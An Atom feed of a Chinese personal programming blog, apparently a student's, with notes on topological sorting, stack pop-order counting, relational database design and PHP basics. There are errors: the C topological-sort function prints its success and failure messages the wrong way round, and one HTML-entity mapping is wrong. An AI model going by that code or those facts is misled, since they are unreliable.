<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>方·圆--方寸之间  丨 博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.fangmingxuan.com/"/>
  <updated>2020-12-20T07:16:24.877Z</updated>
  <id>http://www.fangmingxuan.com/</id>
  
  <author>
    <name>别人家的小方</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>数据结构--拓扑排序</title>
    <link href="http://www.fangmingxuan.com/2020/12/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F/"/>
    <id>http://www.fangmingxuan.com/2020/12/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F/</id>
    <published>2020-12-20T06:12:36.622Z</published>
    <updated>2020-12-20T07:16:24.877Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="数据结构–拓扑排序"><a href="#数据结构–拓扑排序" class="headerlink" title="数据结构–拓扑排序"></a>数据结构–拓扑排序</h2><blockquote><p>拓扑排序是图中重要的操作之一,在实际中应用很广泛.再AOV网中,不应该出现有向环路,因为有环意味着某项活动以自己作为先决条件,这样就进入了死循环.因此,对给定的AOV网应该首先判定网中是否存在环<em>.*</em>检测的办法就是对有向图进行拓扑排序,拓扑排序是指照有向图给出的次序关系,将图中顶点排成一个线性序列,对于有向图中没有限定次序关系的顶点,则可以人为加上任意的次序关系.由此所得顶点的线性序列称为拓扑有序序列.***</p></blockquote><h2 id="1-拓扑排序的定义"><a href="#1-拓扑排序的定义" class="headerlink" title="1.拓扑排序的定义"></a>1.拓扑排序的定义</h2><blockquote><p>给出有向图<strong>G - ( V , E )</strong>, 对于<strong>V</strong>中顶点的线性序列<strong>(v1,v2,……,vk)</strong>,如果满足如下条件: 若在 <strong>G</strong> 中从顶点 <strong>vi</strong> 到 <strong>vj</strong> 有一条路径,则在序列中顶点 <strong>vi</strong> 必须在顶点 <strong>vj</strong> 之前,称该序列为 <strong>G</strong> 的一个拓扑序列. <strong>构造有向图的拓扑序列的过程称为拓扑排序.</strong></p></blockquote><h3 id="1-拓扑排序的注意事项"><a href="#1-拓扑排序的注意事项" class="headerlink" title="( 1 ) 拓扑排序的注意事项"></a>( 1 ) 拓扑排序的注意事项</h3><ol><li>再AOV 网中,若不存在回路.则所有活动可排成一个线性序列,使得每个活动的所有前驱活动都排在该活动的前面,那么该序列为拓扑序列.</li><li>拓扑序列不是唯一的.</li><li>对AOV图不一定都有拓扑序列.</li><li>从前驱和后继的传递性和反自反性来看,AOV 网中不能出现有向回路(或称有向环).再AOV网中如果出现了有向环,则意味着某项活动应以自己作为先决条件,这不是对的,工程将无法进行.对程序流程而言,将出现死循环.因此,对给定的AOV网,应先判断它是否存在有向环.判断AOV网是否存在有向环的方法是对该AOV网进行拓扑排序,将AOV网中的顶点排列成一个线性有序序列,若该线性序列,若该线性序列中包含AOV 网全部的顶点,则AOV 网中无环,否则,AOV网中存在有向环,该网所代表的工程是不可行的.</li></ol><h3 id="2-拓扑排序的实际意义"><a href="#2-拓扑排序的实际意义" class="headerlink" title="( 2 )拓扑排序的实际意义"></a>( 2 )拓扑排序的实际意义</h3><p>如果按照拓扑序列中的顶点次序进行每一项活动,就能够保证在每一项活动时,他的所有前驱活动均已完成,从而使整个工程顺序执行.</p><h3 id="3-拓扑排序的基本步骤"><a href="#3-拓扑排序的基本步骤" class="headerlink" title="( 3 ) 拓扑排序的基本步骤"></a>( 3 ) 拓扑排序的基本步骤</h3><ol><li>在AOV网中选一个<strong>入度为0</strong>的顶点 ( <em>即没有前驱</em> ) 且输出之.</li><li>从AOV网中删除此顶点以及从该顶点发出来的所有有向边;</li><li>重复 <strong>1  , 2</strong>两步,知道AOV网中所有的顶点都被输出或网中不存在入度为 0 的顶点.</li></ol><p>从拓扑排序步骤可知,若在第三步中,网中所有顶点都被输出,则表明网中无有向环,拓扑排序成功,若按照拓扑排序的顺序开展活动则此工程能顺利完成;若仅输出部分顶点,网中已不存在入度为 0 的顶点,则表明网中有有向环,拓扑排序不成功,则此工程不能顺利完成.</p><h2 id="2-拓扑排序的实现"><a href="#2-拓扑排序的实现" class="headerlink" title="2.拓扑排序的实现"></a>2.拓扑排序的实现</h2><ul><li>AOV网一般采用邻接表的存储方式,为了标记某个顶点是否有前驱节点,可以在邻接表的头结点中增加一个记录顶点入度的数据域.</li></ul><p>*<em>头结点结构体定义为 : *</em></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">VexNode</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> innum;         <span class="comment">//顶点的入度值</span></span><br><span class="line">    VexInfo vex;       <span class="comment">//顶点的信息</span></span><br><span class="line">    ArcNode *firstarc; <span class="comment">//标记第一个 vi 的邻接节点的指针</span></span><br><span class="line">&#125;VexNode VexList[MaxVerNum];</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">innum</th><th align="center">vex</th><th align="center">firstarc</th></tr></thead><tbody><tr><td align="center"></td><td align="center"><strong>头结点示意图</strong></td><td align="center"></td></tr></tbody></table><p>此外,我们还需要一个栈来保存拓扑排序过程中入度为 0 的顶点.</p><h2 id="算法-拓扑排序"><a href="#算法-拓扑排序" class="headerlink" title="算法: 拓扑排序"></a>算法: 拓扑排序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TopologicalOrder</span><span class="params">(ALGraph G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    InitStack(<span class="built_in">stack</span>);</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>( i=<span class="number">0</span> ;i &lt; G.vexnum ; i++ )</span><br><span class="line">        <span class="keyword">if</span>(VexList[i].innum==<span class="number">0</span>) Push(<span class="built_in">stack</span>,i);</span><br><span class="line">    <span class="keyword">while</span> (!EmptyStack(<span class="built_in">stack</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        Pop(<span class="built_in">stack</span>,i);</span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">for</span>(p=G.vexs[i].firstarc;p!=<span class="literal">NULL</span>;p=p-&gt;nextarc)</span><br><span class="line">        &#123;</span><br><span class="line">        k=p-&gt;adjvex;</span><br><span class="line">            VexList[k].innum--;</span><br><span class="line">            <span class="keyword">if</span>(VexList[k].innum==<span class="number">0</span>) Push(<span class="built_in">stack</span>,k);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(count==G.vexnum) <span class="built_in">printf</span>(<span class="string">"拓扑排序失败,网中存在回路 ."</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"拓扑排序成功,网中不存在回路 . "</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><strong>通过上面算法的温习,可以看出 , 对 有 n 个顶点 和 e 条边的有向图来说,求个各顶点入度的时间复杂度为 O(e),建立辅助栈的时间复杂度为O(n).当一个图拓扑排序成功时.所有顶点入度减1 的操作进行了e次.因此拓扑排序的时间复杂度为O(e+n).</strong></p></li><li><p><strong>有向无环图可以采用深度优先遍历的方法进行拓扑排序.从图中某一顶点出发进行深度优先遍历时最先退出DFS函数的顶点即为出度为 0 的顶点,它是拓扑序列的最后一个顶点.我们用一个临时数组按照先后顺序保存退出DFS函数的顶点,然后逆向输入该数组得到的就是拓扑有序序列.</strong></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="数据结构" scheme="http://www.fangmingxuan.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
      <category term="算法" scheme="http://www.fangmingxuan.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://www.fangmingxuan.com/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="数据结构" scheme="http://www.fangmingxuan.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>数据结构--出栈顺序</title>
    <link href="http://www.fangmingxuan.com/2020/12/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%88/"/>
    <id>http://www.fangmingxuan.com/2020/12/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%88/</id>
    <published>2020-12-19T10:27:38.474Z</published>
    <updated>2020-12-19T10:35:05.481Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="数据结构–出栈顺序"><a href="#数据结构–出栈顺序" class="headerlink" title="数据结构–出栈顺序"></a>数据结构–出栈顺序</h1><blockquote><p>近日在复习数据结构，看到栈的时候，发现1个元素进栈，有1种出栈顺序；2个元素进栈，有2种出栈顺序；3个元素进栈，有5种出栈顺序，那么一个很自然地问题就是n个元素进栈，共有多少种出栈顺序？</p></blockquote><blockquote><p>我们把n个元素的出栈个数的记为f(n), 那么对于1,2,3, 我们很容易得出：</p><p> f(1) = 1   //即 1</p><p>​                   f(2) = 2   //即 12、21</p><p>​                   f(3) = 5   //即 123、132、213、321、231</p><p>然后我们来考虑f(4), 我们给4个元素编号为a,b,c,d, 那么考虑：元素a只可能出现在1号位置，2号位置，3号位置和4号位置(很容易理解，一共就4个位置，比如abcd,元素a就在1号位置)。               </p></blockquote><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><ul><li><p>1) 如元素a在1号位置，那么只可能a进栈，马上出栈，此时还剩元素b、c、d等待操作，就是子问题f(3)；</p></li><li><p>2) 如果元素a在2号位置，那么一定有一个元素比a先出栈，即有f(1)种可能顺序（只能是b），还剩c、d，即f(2)，   根据乘法原理，一共的顺序个数为f(1) * f(2)；</p></li><li><p>3) 如果元素a在3号位置，那么一定有两个元素比1先出栈，即有f(2)种可能顺序（只能是b、c），还剩d，即f(1)，根据乘法原理，一共的顺序个数为f(2) * f(1)；</p></li><li><p>4) 如果元素a在4号位置，那么一定是a先进栈，最后出栈，那么元素b、c、d的出栈顺序即是此小问题的解，即     f(3)；</p></li></ul><blockquote><p>结合所有情况，即f(4) = f(3) + f(2) * f(1) + f(1) * f(2) + f(3);<br>为了规整化，我们定义f(0) = 1；于是f(4)可以重新写为：<br>f(4) = f(0)<em>f(3) + f(1)</em>f(2) + f(2) * f(1) + f(3)<em>f(0)<br>然后我们推广到n，推广思路和n=4时完全一样，于是我们可以得到：<br>f(n) = f(0)</em>f(n-1) + f(1)<em>f(n-2) + … + f(n-1)</em>f(0)</p></blockquote><p>即</p><p><img src="/" class="lazyload" data-src="http://qiniuph.fangmingxuan.com/img/1342588652_5874.png"  alt="1342588652_5874"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="数据结构" scheme="http://www.fangmingxuan.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
      <category term="数据结构" scheme="http://www.fangmingxuan.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>Mysql Fighting</title>
    <link href="http://www.fangmingxuan.com/2020/11/MysqlFighting/"/>
    <id>http://www.fangmingxuan.com/2020/11/MysqlFighting/</id>
    <published>2020-11-19T07:45:20.000Z</published>
    <updated>2020-11-23T09:12:23.603Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Mysql-冲呀！！"><a href="#Mysql-冲呀！！" class="headerlink" title="Mysql 冲呀！！"></a>Mysql 冲呀！！</h1><h2 id="Web数据库设计"><a href="#Web数据库设计" class="headerlink" title="Web数据库设计"></a>Web数据库设计</h2><h3 id="0x1-关系型数据库概念："><a href="#0x1-关系型数据库概念：" class="headerlink" title="0x1 关系型数据库概念："></a><strong>0x1</strong> 关系型数据库概念：</h3><blockquote><p>至今为止，关系型数据库是最常用的数据库类型。他们强依赖关系代数中的一些优秀的理论基础。当使用关系型数据库的时候，并不需要了解关系理论，但是还是需要了解一些关于关系型数据库的基本概念 </p></blockquote><h4 id="0x1x1-表"><a href="#0x1x1-表" class="headerlink" title="0x1x1 表"></a><strong>0x1x1</strong> <strong>表</strong></h4><blockquote><p>关系型数据库由关系组成，这些关系通常称为表。顾名思义，表就是一个数据表。如果曾使用过电子数据表，那你就已经用过表了。</p><p>如下，这个表包括了Boox-O-Rama 书店客户的姓名与地址</p></blockquote><ul><li><p><strong>Customers</strong></p><table><thead><tr><th>CustomerID</th><th>Name</th><th>Address</th><th>City</th></tr></thead><tbody><tr><td>1</td><td>Julia Smith</td><td>25 Oak Street</td><td>Airport West</td></tr><tr><td>2</td><td>Alan Wong</td><td>1/47 Haines Avenue</td><td>Box Hill</td></tr><tr><td>3</td><td>Michelle Arthur</td><td>357 North Road</td><td>Yarraville</td></tr></tbody></table><p>该表具有一个名称（Customers），几个数据列，每一列对应于一种不同的数据；以及每一行记录对应一个客户。</p></li></ul><h4 id="0x1x2-列"><a href="#0x1x2-列" class="headerlink" title="0x1x2 列"></a><strong>0x1x2</strong> <strong>列</strong></h4><blockquote><p>表中的每一个列都有唯一的名称，包含不同的数据。此外，每一列都有一个相关的数据类型。例如，在Customers表中，可以看到CustomerID 列是一个整型数据，而其他三列是字符串类型的数据。<strong>有时，列也叫字段或者属性。</strong></p></blockquote><h4 id="0x1x3-行"><a href="#0x1x3-行" class="headerlink" title="0x1x3 行"></a><strong>0x1x3</strong> <strong>行</strong></h4><blockquote><p>表中的每一行代表一个客户。每一行具有相同的格式，因而也具有相同的属性。<strong>行也称为记录或元组（Tuple）</strong></p></blockquote><h4 id="0x1x4-值"><a href="#0x1x4-值" class="headerlink" title="0x1x4 值"></a><strong>0x1x4 值</strong></h4><blockquote><p>每一行有对应于每一列的单个值组成。每个值必须与该列定义的数据类型相同</p></blockquote><h4 id="0x1x5-键"><a href="#0x1x5-键" class="headerlink" title="0x1x5 键"></a><strong>0x1x5 键</strong></h4><blockquote><p>我们必须有一个能够识别一个特定客户的办法。通常，名称并不是一个很好的方法—如果名字很普通我们就会明白为什么。以Customers表中Julie Smith 客户为例，当打开电话本的时候们会发现里面相同名字的不计其数。</p></blockquote><ul><li>在Customers示例中我们已经做的，以及可能要在应用程序中做的就是为每一个客户分配一个唯一的CustomerID。其原则与我们拥有唯一的银行账号或者身份证号码一个道理，它使得将详细信息存储到数据库的操作更为方便。手动分配的身份识别号能够保证唯一性。对于一些真实信息的组合，同样也具有这个属性</li><li><strong>一个表中用来标识数据的列称为键或主键。</strong> 一个键可能由几列组成。例如，如果选择用“Julie Smith，of 25 oak street，Airport West”来标识julie，那么该键包含三列：名字，地址，城市，而且这样还不能保证其唯一性.</li></ul><h4 id="0x1x6-模式"><a href="#0x1x6-模式" class="headerlink" title="0x1x6 模式"></a><strong>0x1x6 模式</strong></h4><blockquote><p>数据库整套表的完整设计称为数据库的模式。它是数据库的设计蓝图。模式应该显示表格及表格的列，每个表的主键和外键。模式并不会包含任何数据，但是我们可能会希望在模式里使用示例数据来解析这些数据的含义。模式可以在非正式的图表，实体关系图标，或者以为本的格式表示。如以下代码所示： </p></blockquote><ul><li>Customers（<u>CustomerID</u>,<i>Name</i>,Address,City)<br>在这一模式种，带有下划线的元素表示该元素是所在关系的主键。斜体元素表示该元素是其所在关系的外键。</li></ul><h4 id="0x1x7-关系"><a href="#0x1x7-关系" class="headerlink" title="0x1x7 关系"></a><strong>0x1x7 关系</strong></h4><blockquote><p><strong>外键</strong>表示两个表中数据之间的关系。例如，Orders表到Customers表的链接关系表示Orders 表中一行与Customers 表一行的关系。<br><strong>关系型数据库</strong>中有3种基本的关系类型.根据关系双方所含对象的多少,可以将这些关系分为3种关系:<strong>一对一,一对多和多对多</strong></p></blockquote><ul><li><strong>一对一关系</strong>表示关系双方只有一个对象互相对应.例如,如果将Addresses 放入与Customers 表分离出的一个独立表中,则该表和Customers 表就是一对一关系.表Addresses 表到 Customers表到Addresses 表也可以有外键( 两者都不是必要的 )</li><li><strong>一对多关系</strong>里,一个表中的一行与另一个表中的多行具有互相关联的关系.在这个示例中,一个用户可能由许多订单,在这些关系中,包含多行的表对应于包含一行的表应该有一个外键.在这里,讲CustomerID 放到Order 表中以显示其关系.</li><li><strong>多对多关系</strong>里,表中的多行与另一个表中的多行具有相互关联的关系.例如:如果有两个表Books 和Authors.我们会发现一本书可能有两个作者完成,这两个作者又独自著有或者与其他人合著有其他著作.通常,这种关系类型各自都要有一个表,因此,肯恶搞需要三个表即 Books,Authors 和 Books_Authors .第三个表只包含其他两个表中的键,将其作为外键对,用来显示哪些作者写了哪些书.</li></ul><h3 id="0x2-设计web数据库："><a href="#0x2-设计web数据库：" class="headerlink" title="0x2 设计web数据库："></a><strong>0x2</strong> 设计web数据库：</h3><blockquote><p>知道什么时候需要一个新表,以及需要哪些键,需要掌握很高的技巧.</p></blockquote><h4 id="0x2x1-考虑真实建模对象"><a href="#0x2x1-考虑真实建模对象" class="headerlink" title="0x2x1 考虑真实建模对象"></a><strong>0x2x1 考虑真实建模对象</strong></h4><blockquote><p>当创建一个数据库时,我们经常为现实世界的实体和关系建立模型,并且存储这些实体对象与关系的信息.</p></blockquote><h4 id="0x2x1-避免保存冗余的数据"><a href="#0x2x1-避免保存冗余的数据" class="headerlink" title="0x2x1 避免保存冗余的数据"></a><strong>0x2x1 避免保存冗余的数据</strong></h4><blockquote><p>保存冗余数据的数据库设计,这将占用空间并且导致数据异常.</p></blockquote><ul><li>会产生两个基本问题<ul><li>首先是空间的浪费.</li><li>第二个问题是它会导致数据更新的不一致,也就是说,在修改数据库之后容易产生数据不一致.数据的完整性将被破坏,以至于我们不知道哪些数据正确,哪些数据不正确,通常这会导致信息的丢失.</li></ul></li><li>这里,需要避免3种情况的更新异常:修改插入的删除异常.</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="数据库" scheme="http://www.fangmingxuan.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
      <category term="mysql" scheme="http://www.fangmingxuan.com/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>PHP -- 学习笔记</title>
    <link href="http://www.fangmingxuan.com/2020/10/php/"/>
    <id>http://www.fangmingxuan.com/2020/10/php/</id>
    <published>2020-10-18T11:01:34.256Z</published>
    <updated>2020-10-26T11:07:14.137Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="PHP学习笔记-谨此记录-以督促自己"><a href="#PHP学习笔记-谨此记录-以督促自己" class="headerlink" title="PHP学习笔记(谨此记录,以督促自己!)"></a>PHP学习笔记(谨此记录,以督促自己!)</h1><h1 id="一-PHP魔术变量"><a href="#一-PHP魔术变量" class="headerlink" title="一.PHP魔术变量"></a>一.PHP魔术变量</h1><ul><li><p>PHP向它运行的任何脚本提供了大量的预定义常量,但很多常量都是由不同的库定义的,只有在加载了这些库才会出现,或者动态加载后,或者编译时已经包括进去了.<br>有八个魔术常量他们的值随着他们在代码中的位置改变而改变.</p><ul><li><p><strong>_LINE _</strong>  文件中当前行号.  </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'这是第 " '</span>  . <span class="keyword">__LINE__</span> . <span class="string">' " 行'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>_FILE _</strong>  <strong>文件的完整路径和文件名</strong>.如果用在被包含的文件中,则返回被包含的文件名.</p></li><li><p><strong>_DIR _</strong>  <strong>文件所在目录</strong>.如果用在被包括的文件中,则返回被包括的文件所在的目录.</p></li><li><p><strong>_FUNCTION _</strong>  <strong>函数名称</strong>, 返回该函数被定义时的名字(<strong><em>区分大小写</em></strong>).</p></li><li><p><strong>_CLASS _</strong> 类的名称.返回该类被定义时的名字.</p></li><li><p><strong>_METHOD _</strong> 类的方法名.返回改方法被定义时的名字</p></li><li><p><strong>_NAMESPACE _</strong> 当前命名空间的名称(区分大小写) .此常量是在编译时定义的</p></li><li><p><strong>_TRAIT _</strong> Trait的名字 ,自PHP5.4开始,PHP实现了代码复用的一个方法,称为traits.</p><ul><li>Trait名包括其被声明的作用区域<ul><li>从基类继承的成员被插入的SayWorld Trait 中MyHelloWorld 方法覆盖.<strong>其行为 MyHelloWorld 类中定义的方法一致</strong>.优先顺序时当前类中的方法会覆盖trait的方法,而trait方法又覆盖了基类中的方法</li></ul></li></ul></li></ul></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">trait</span> SayWorld &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::sayHello();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'World!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHelloWorld</span> <span class="keyword">extends</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">SayWorld</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$o = <span class="keyword">new</span> MyHelloWorld();</span><br><span class="line">$o-&gt;sayHello();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="二-PHP表单"><a href="#二-PHP表单" class="headerlink" title="二.PHP表单"></a>二.PHP表单</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"study.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>当用户填完表单并点击提交按钮时,表单的数据会被送往名为”study.php”文件</li></ul><h2 id="GET-POST-和-REQUEST-的区别"><a href="#GET-POST-和-REQUEST-的区别" class="headerlink" title="$ _GET  $ _POST  和 $ _REQUEST 的区别"></a>$ _GET  $ _POST  和 $ _REQUEST 的区别</h2><ul><li><strong>$ _GET</strong> 变量 接受所有以<strong>get</strong>方式发送的请求,<strong>以及浏览器地址栏</strong>中的 <strong>?</strong> 之后的内容.</li><li><strong>$ _POST</strong> 变量接受所有以 <strong>post</strong> 方式发送的请求 </li><li><strong>$ _REQUEST</strong> 支持两种方式发送过来的请求,,显示不显示要看传递方法,<strong>get会显示再url中(有字符限制) ,post不会显示再url中.可以传递人一多的数据 (只要服务器支持).</strong></li></ul><h2 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a>htmlspecialchars()</h2><ul><li><strong>htmlspecialchars()</strong>函数把一些预定义的字符转换为HTML实体.<ul><li><strong>&amp;</strong> (和) 成为 <strong>&amp;amp</strong> ;</li><li><strong>“</strong> (双引号)  成为 <strong>&amp;quot</strong> ;</li><li><strong>‘</strong> (单引号) 成为 <strong>&amp;#039</strong> ;</li><li><strong>&lt;</strong> (小于) 成为 <strong>&amp;it</strong> ;</li><li><strong>&gt;</strong>(大于) 成为 <strong>&amp;gt</strong> ;</li></ul></li></ul><h2 id="SERVER-“PHP-SELF”-变量"><a href="#SERVER-“PHP-SELF”-变量" class="headerlink" title="$ _SERVER[“PHP_SELF”] 变量"></a>$ _SERVER[“PHP_SELF”] 变量</h2><ul><li><strong>$ _SERVER[“PHP_SELF”]</strong> 是超级全局变量,返回当前正在执行脚本的文件名,与document root 相关.所以 <strong>$ _SERVER[“PHP_SELF”]</strong> 会发送表单数据到当前页面,而不是跳转到不同的页面.</li></ul><h2 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h2><ul><li><p><strong>验证名称</strong> preg_match  —进行正则表达式匹配</p><ul><li><p><strong>int preg_match(string $pattern, string $subject [, array $matches[,int $flags]])</strong></p></li><li><p><strong>在subject字符串中搜索与pattern给出的正则表达式相匹配的内容.如果提供了matches</strong> ,则其会被搜索的结果所填充. $ matches[0] 将包含与整个模式匹配的文本,$matches[1] 将包含于第一个捕获的括号中的子模式所匹配的文本,以此类推.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$name = test_input($_POST[<span class="string">"name"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z ]*$/"</span>,$name)) &#123;</span><br><span class="line">  $nameErr = <span class="string">"只允许字母和空格"</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>验证邮件</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$email = test_input($_POST[<span class="string">"email"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">"/([\w\-]+\@[\w\-]+\.[\w\-]+)/"</span>,$email)) &#123;</span><br><span class="line">  $emailErr = <span class="string">"非法邮箱格式"</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>验证url</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$website = test_input($_POST[<span class="string">"website"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">"/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&amp;@#\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\/%=~_|]/i"</span>,$website)) &#123;</span><br><span class="line">  $websiteErr = <span class="string">"非法的 URL 的地址"</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="三-PHP高级编程"><a href="#三-PHP高级编程" class="headerlink" title="三.PHP高级编程"></a>三.PHP高级编程</h1><h2 id="1-多维数组"><a href="#1-多维数组" class="headerlink" title="1.多维数组"></a>1.多维数组</h2><p><strong>一个数组的值可以是另一个数组,而另一个数组的值也可以是一个数组.这下再继续套娃下去,那就可以创建一个多维数组</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ar=<span class="keyword">array</span></span><br><span class="line">(</span><br><span class="line">    <span class="string">"fangmingxuan"</span>=&gt;<span class="keyword">array</span></span><br><span class="line">    (</span><br><span class="line">        <span class="string">"方明轩"</span>,<span class="string">"19"</span></span><br><span class="line">    ),</span><br><span class="line">    <span class="string">"shaozhuqing"</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> 我叫.$ar[<span class="string">'fangmingxuan'</span>][<span class="number">0</span>].<span class="string">",我今年 "</span>.$ar[<span class="string">'fangmingxuan'</span>][<span class="number">1</span>].<span class="string">"岁!!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>以上输出结果为</strong>:</p><p><img src="/" class="lazyload" data-src="http://qiniuph.fangmingxuan.com/img/image-20201021191819010.png"  alt="image-20201021191819010"></p><h2 id="2-PHP包含"><a href="#2-PHP包含" class="headerlink" title="2.PHP包含"></a>2.PHP包含</h2><ul><li>PHP 中,可以在服务器执行PHP文件之前在该文件中插入一个文件的内容.</li><li><strong>include</strong> 和 <strong>require</strong> 语句用于在执行流中插入写在其他文件中的有用代码.</li></ul><h3 id="include-和require-除了处理错误的方式不同之外-在其他方面都是相同的"><a href="#include-和require-除了处理错误的方式不同之外-在其他方面都是相同的" class="headerlink" title="include 和require 